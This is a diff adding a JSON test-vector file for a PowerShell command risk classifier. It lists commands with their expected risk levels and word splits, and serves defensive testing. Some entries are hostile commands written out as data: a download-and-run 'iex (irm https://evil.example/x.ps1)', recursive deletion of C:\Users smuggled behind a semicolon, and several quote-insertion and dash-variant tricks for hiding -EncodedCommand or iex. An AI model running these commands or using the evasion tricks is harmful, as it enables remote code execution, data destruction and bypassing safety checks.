@@ -1,0 +1,448 @@
+{
+  "description": "Shared Rust/WASM vector for the PowerShell command builder (#298). Every expected value is written by hand from the rules in crates/allw-core/src/powershell.rs (argv is always a whitespace split of raw; risk floor Medium; High when raw contains ; | & a line break, a backtick, ( {, [scriptblock] or .invoke, a nested-execution command word (iex, Invoke-Expression, Invoke-Command, icm, Start-Process, start, saps, Start-Job, sajb, powershell, pwsh, cmd), as written or with every quote character in raw deleted, an -EncodedCommand parameter or prefix (or -ec), led by one or two of - / U+2013 U+2014 U+2015, with every quote character in the token ignored (or only the quoted segment it starts with), a command named like PowerShell itself (a name starting pwsh or powershell, after any path and with its quotes removed), or dot-sourcing (a leading . word, or . directly followed by a quote or $); raw verbatim); never regenerate it from program output.",
+  "cases": [
+    {
+      "class": "low-risk program raised to the Medium floor",
+      "command": "ls",
+      "cwd": "C:\\work",
+      "risk": "medium",
+      "bin": "ls",
+      "argv": ["ls"]
+    },
+    {
+      "class": "cmdlet the table doesn't know is Medium",
+      "command": "Remove-Item -Recurse -Force build",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Remove-Item",
+      "argv": ["Remove-Item", "-Recurse", "-Force", "build"]
+    },
+    {
+      "class": "risk above the floor is kept (High)",
+      "command": "rm -rf build",
+      "cwd": null,
+      "risk": "high",
+      "bin": "rm",
+      "argv": ["rm", "-rf", "build"]
+    },
+    {
+      "class": "risk above the floor is kept (Critical)",
+      "command": "dd if=x of=y",
+      "cwd": null,
+      "risk": "critical",
+      "bin": "dd",
+      "argv": ["dd", "if=x", "of=y"]
+    },
+    {
+      "class": "backtick escape: whitespace argv, High floor",
+      "command": "Write-Output \"it`\"s\"",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Write-Output",
+      "argv": ["Write-Output", "\"it`\"s\""]
+    },
+    {
+      "class": "#316 B1: a POSIX-quoting trick can't hide Remove-Item inside a token",
+      "command": "echo \"a\\\" ; Remove-Item -Recurse -Force C:\\Users ; echo \\\"b\"",
+      "cwd": null,
+      "risk": "high",
+      "bin": "echo",
+      "argv": [
+        "echo",
+        "\"a\\\"",
+        ";",
+        "Remove-Item",
+        "-Recurse",
+        "-Force",
+        "C:\\Users",
+        ";",
+        "echo",
+        "\\\"b\""
+      ]
+    },
+    {
+      "class": "#316 B1: a Windows path keeps its backslashes",
+      "command": "Remove-Item C:\\Users\\me\\proj\\build -Recurse",
+      "cwd": "C:\\Users\\me",
+      "risk": "medium",
+      "bin": "Remove-Item",
+      "argv": ["Remove-Item", "C:\\Users\\me\\proj\\build", "-Recurse"]
+    },
+    {
+      "class": "#316 S1: a pipeline into a script block fails upward",
+      "command": "ls | % { rm $_ -Force }",
+      "cwd": null,
+      "risk": "high",
+      "bin": "ls",
+      "argv": ["ls", "|", "%", "{", "rm", "$_", "-Force", "}"]
+    },
+    {
+      "class": "#316 S1: iex runs a downloaded string",
+      "command": "iex (irm https://evil.example/x.ps1)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "iex",
+      "argv": ["iex", "(irm", "https://evil.example/x.ps1)"]
+    },
+    {
+      "class": "round 2: a grouping expression runs a nested pipeline",
+      "command": "Write-Output (Remove-Item -Recurse -Force build)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Write-Output",
+      "argv": ["Write-Output", "(Remove-Item", "-Recurse", "-Force", "build)"]
+    },
+    {
+      "class": "round 2: an array subexpression",
+      "command": "echo @(Remove-Item build)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "echo",
+      "argv": ["echo", "@(Remove-Item", "build)"]
+    },
+    {
+      "class": "round 2: [scriptblock]::Create builds code at run time",
+      "command": "[scriptblock]::Create($s)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "[scriptblock]::Create($s)",
+      "argv": ["[scriptblock]::Create($s)"]
+    },
+    {
+      "class": "round 2: & { } invokes a script block",
+      "command": "& { Remove-Item build }",
+      "cwd": null,
+      "risk": "high",
+      "bin": "&",
+      "argv": ["&", "{", "Remove-Item", "build", "}"]
+    },
+    {
+      "class": "round 2: .Invoke() runs a script block",
+      "command": "$sb.Invoke()",
+      "cwd": null,
+      "risk": "high",
+      "bin": "$sb.Invoke()",
+      "argv": ["$sb.Invoke()"]
+    },
+    {
+      "class": "round 2: Invoke-Command runs a script block",
+      "command": "Invoke-Command -ScriptBlock $sb",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Invoke-Command",
+      "argv": ["Invoke-Command", "-ScriptBlock", "$sb"]
+    },
+    {
+      "class": "round 2: Start-Process starts another program",
+      "command": "Start-Process notepad.exe",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Start-Process",
+      "argv": ["Start-Process", "notepad.exe"]
+    },
+    {
+      "class": "round 2: Start-Job runs a script in the background",
+      "command": "Start-Job -FilePath job.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Start-Job",
+      "argv": ["Start-Job", "-FilePath", "job.ps1"]
+    },
+    {
+      "class": "round 2: a nested shell",
+      "command": "powershell -Command Remove-Item build",
+      "cwd": null,
+      "risk": "high",
+      "bin": "powershell",
+      "argv": ["powershell", "-Command", "Remove-Item", "build"]
+    },
+    {
+      "class": "round 2: -EncodedCommand hides the command",
+      "command": "pwsh -EncodedCommand SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh",
+      "argv": ["pwsh", "-EncodedCommand", "SQBFAFgA"]
+    },
+    {
+      "class": "round 2: -enc (a prefix of -EncodedCommand)",
+      "command": "Write-Output -enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Write-Output",
+      "argv": ["Write-Output", "-enc", "SQBFAFgA"]
+    },
+    {
+      "class": "round 2: -e (the shortest prefix), any case",
+      "command": "Write-Output -E SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "Write-Output",
+      "argv": ["Write-Output", "-E", "SQBFAFgA"]
+    },
+    {
+      "class": "round 2: dot-sourcing runs a script in the current scope",
+      "command": ". .\\payload.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": ".",
+      "argv": [".", ".\\payload.ps1"]
+    },
+    {
+      "class": "round 2: -Exclude is not a prefix of -EncodedCommand",
+      "command": "Get-ChildItem -Exclude x",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Get-ChildItem",
+      "argv": ["Get-ChildItem", "-Exclude", "x"]
+    },
+    {
+      "class": "round 3: start (alias of Start-Process)",
+      "command": "start notepad.exe",
+      "cwd": null,
+      "risk": "high",
+      "bin": "start",
+      "argv": ["start", "notepad.exe"]
+    },
+    {
+      "class": "round 3: saps (alias of Start-Process)",
+      "command": "saps notepad.exe",
+      "cwd": null,
+      "risk": "high",
+      "bin": "saps",
+      "argv": ["saps", "notepad.exe"]
+    },
+    {
+      "class": "round 3: icm (alias of Invoke-Command)",
+      "command": "icm -FilePath x.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": "icm",
+      "argv": ["icm", "-FilePath", "x.ps1"]
+    },
+    {
+      "class": "round 3: sajb (alias of Start-Job)",
+      "command": "sajb -FilePath x.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": "sajb",
+      "argv": ["sajb", "-FilePath", "x.ps1"]
+    },
+    {
+      "class": "round 3: dot-source of a single-quoted path",
+      "command": ".'x.ps1'",
+      "cwd": null,
+      "risk": "high",
+      "bin": ".'x.ps1'",
+      "argv": [".'x.ps1'"]
+    },
+    {
+      "class": "round 3: dot-source of a double-quoted path",
+      "command": ".\"x.ps1\"",
+      "cwd": null,
+      "risk": "high",
+      "bin": ".\"x.ps1\"",
+      "argv": [".\"x.ps1\""]
+    },
+    {
+      "class": "#328: -enc with an en dash (U+2013) on a pwsh-* binary",
+      "command": "pwsh-preview –enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh-preview",
+      "argv": ["pwsh-preview", "–enc", "SQBFAFgA"]
+    },
+    {
+      "class": "#328: -EncodedCommand with an em dash (U+2014)",
+      "command": "pwsh-preview —EncodedCommand SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh-preview",
+      "argv": ["pwsh-preview", "—EncodedCommand", "SQBFAFgA"]
+    },
+    {
+      "class": "#328: -enc with a horizontal bar (U+2015)",
+      "command": "pwsh-preview ―enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh-preview",
+      "argv": ["pwsh-preview", "―enc", "SQBFAFgA"]
+    },
+    {
+      "class": "#328: single-quoted -enc",
+      "command": "pwsh-preview '-enc' SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh-preview",
+      "argv": ["pwsh-preview", "'-enc'", "SQBFAFgA"]
+    },
+    {
+      "class": "#328: double-quoted -enc",
+      "command": "pwsh-preview \"-enc\" SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh-preview",
+      "argv": ["pwsh-preview", "\"-enc\"", "SQBFAFgA"]
+    },
+    {
+      "class": "#328: renamed binary with an en-dash -enc (only the parameter check applies)",
+      "command": "C:\\tools\\p.exe –enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "–enc", "SQBFAFgA"]
+    },
+    {
+      "class": "#328: renamed binary with a quoted -enc (only the parameter check applies)",
+      "command": "C:\\tools\\p.exe '-enc' SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "'-enc'", "SQBFAFgA"]
+    },
+    {
+      "class": "#328: a pwsh-* binary with no other trigger is a nested shell",
+      "command": "pwsh-preview -File x.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": "pwsh-preview",
+      "argv": ["pwsh-preview", "-File", "x.ps1"]
+    },
+    {
+      "class": "#328 near miss: an en dash on a parameter that isn't -EncodedCommand stays Medium",
+      "command": "Get-ChildItem –Exclude x",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Get-ChildItem",
+      "argv": ["Get-ChildItem", "–Exclude", "x"]
+    },
+    {
+      "class": "#336 R1: doubled ASCII dash",
+      "command": "C:\\tools\\p.exe --enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "--enc", "SQBFAFgA"]
+    },
+    {
+      "class": "#336 R1: doubled en dash",
+      "command": "C:\\tools\\p.exe ––enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "––enc", "SQBFAFgA"]
+    },
+    {
+      "class": "#336 R1: mixed dash pair (fails upward)",
+      "command": "C:\\tools\\p.exe -–enc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "-–enc", "SQBFAFgA"]
+    },
+    {
+      "class": "#336 R2: quoted parameter name after the dash",
+      "command": "C:\\tools\\p.exe -\"enc\" SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "-\"enc\"", "SQBFAFgA"]
+    },
+    {
+      "class": "#336 R2: empty quotes inside the parameter",
+      "command": "C:\\tools\\p.exe -e''nc SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "-e''nc", "SQBFAFgA"]
+    },
+    {
+      "class": "#336 R2: token starting with a quoted parameter",
+      "command": "C:\\tools\\p.exe \"-e\"SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "\"-e\"SQBFAFgA"]
+    },
+    {
+      "class": "#336 R2: quote insertion in the program name",
+      "command": "p''wsh -File x.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": "p''wsh",
+      "argv": ["p''wsh", "-File", "x.ps1"]
+    },
+    {
+      "class": "#336 N1: curly single quotes around -enc",
+      "command": "C:\\tools\\p.exe ‘-enc’ SQBFAFgA",
+      "cwd": null,
+      "risk": "high",
+      "bin": "C:\\tools\\p.exe",
+      "argv": ["C:\\tools\\p.exe", "‘-enc’", "SQBFAFgA"]
+    },
+    {
+      "class": "#336 near miss: doubled dash on -Exclude stays Medium",
+      "command": "Get-ChildItem --Exclude x",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Get-ChildItem",
+      "argv": ["Get-ChildItem", "--Exclude", "x"]
+    },
+    {
+      "class": "#336 near miss: -Encoding isn't a prefix of -EncodedCommand",
+      "command": "Set-Content -Encoding utf8 x",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Set-Content",
+      "argv": ["Set-Content", "-Encoding", "utf8", "x"]
+    },
+    {
+      "class": "#341: quote insertion in iex",
+      "command": "i''ex $payload",
+      "cwd": null,
+      "risk": "high",
+      "bin": "i''ex",
+      "argv": ["i''ex", "$payload"]
+    },
+    {
+      "class": "#341: a quote inside Invoke-Expression",
+      "command": "I\"nvoke-Expression $payload",
+      "cwd": null,
+      "risk": "high",
+      "bin": "I\"nvoke-Expression",
+      "argv": ["I\"nvoke-Expression", "$payload"]
+    },
+    {
+      "class": "#341: quote insertion in icm",
+      "command": "i''cm -FilePath x.ps1",
+      "cwd": null,
+      "risk": "high",
+      "bin": "i''cm",
+      "argv": ["i''cm", "-FilePath", "x.ps1"]
+    },
+    {
+      "class": "#341: quote insertion in cmd",
+      "command": "c\"\"md /c del C:\\x",
+      "cwd": null,
+      "risk": "high",
+      "bin": "c\"\"md",
+      "argv": ["c\"\"md", "/c", "del", "C:\\x"]
+    },
+    {
+      "class": "#341 near miss: a quoted file name starting with iex stays Medium",
+      "command": "Get-Item 'iex-notes.txt'",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Get-Item",
+      "argv": ["Get-Item", "'iex-notes.txt'"]
+    },
+    {
+      "class": "#341 near miss: a quoted word containing cmd stays Medium",
+      "command": "Get-Item 'c''mdlets.txt'",
+      "cwd": null,
+      "risk": "medium",
+      "bin": "Get-Item",
+      "argv": ["Get-Item", "'c''mdlets.txt'"]
+    }
+  ]
+}
